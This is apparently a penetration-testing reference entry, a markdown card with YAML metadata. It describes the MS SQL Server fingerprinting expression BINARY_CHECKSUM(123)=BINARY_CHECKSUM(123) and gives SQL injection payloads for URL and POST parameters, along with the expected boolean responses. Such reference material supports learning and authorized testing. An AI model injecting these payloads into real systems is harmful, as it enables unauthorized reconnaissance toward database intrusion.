---
type: command
executor: sql
data: BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Database
tags:
  - sql-injection
  - fingerprinting
verified: true
validated: true
---

# mssql-binary-checksum-test

## Command

```sql
BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
```

## Description

This SQL expression tests for Microsoft SQL Server by invoking the BINARY_CHECKSUM function, which computes a checksum on data. In a SQL injection context, inject as `' AND <expression> --` to check if it evaluates to true without syntax errors, indicating MS SQL Server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Fixed expression; no parameters | N/A |

## Examples

### Basic Usage

In a URL parameter: `?id=1' AND BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123) --`

### In POST Data

`username=admin' AND BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123) --`

## Expected Output

In boolean-based SQLi: Normal page response (true condition) if MS SQL Server; error or false response otherwise. Error might include 'Invalid function' if not MS SQL.

## Related

- [[procedures/DBMS-Fingerprinting-via-SQL-Injection]]
- [[commands/mssql-connections-equality-test]]
